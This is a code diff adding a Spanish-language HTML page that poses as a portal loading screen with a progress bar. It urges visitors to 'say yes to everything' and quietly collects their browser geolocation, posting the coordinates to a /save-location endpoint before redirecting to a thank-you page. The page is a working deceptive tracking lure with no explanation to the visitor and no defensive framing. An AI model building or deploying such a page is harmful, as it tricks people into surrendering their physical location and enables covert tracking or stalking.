@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Importante</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 1rem;
+      font-size: 1.5rem;
+    }
+
+    p {
+      font-size: 1rem;
+      color: #555;
+    }
+
+    .progress-bar {
+      margin: 1.5rem 0;
+      height: 6px;
+      width: 100%;
+      background-color: #e0e0e0;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+
+    .progress-bar-inner {
+      height: 100%;
+      width: 0%;
+      background-color: #4caf50;
+      animation: fill 2s forwards;
+    }
+
+    @keyframes fill {
+      to {
+        width: 100%;
+      }
+    }
+
+    #status {
+      font-weight: bold;
+      margin-top: 1rem;
+      color: #1a73e8;
+    }
+
+    @media (max-width: 480px) {
+      h2 {
+        font-size: 1.25rem;
+      }
+
+      p {
+        font-size: 0.9rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2> Cargando portal</h2>
+    <p>Diga si a todo para acceder</p>
+
+    <div class="progress-bar">
+      <div class="progress-bar-inner"></div>
+    </div>
+
+    <p id="status">Cargando...</p>
+  </div>
+
+  <script>
+    const statusText = document.getElementById('status');
+
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const data = { latitude: lat, longitude: lon };
+
+        fetch('/save-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        })
+        .then(() => {
+          statusText.innerText = 'Cargando';
+          setTimeout(() => {
+            window.location.href = '/thank-you.html';
+          }, 2000);
+        })
+        .catch(() => {
+          statusText.innerText = '❌ Error.';
+          statusText.style.color = 'red';
+        });
+      }, () => {
+        statusText.innerText = '❌ Permission denied.';
+        statusText.style.color = 'red';
+      });
+    } else {
+      statusText.innerText = '❌ Geolocation not supported.';
+      statusText.style.color = 'red';
+    }
+  </script>
+</body>
+</html>
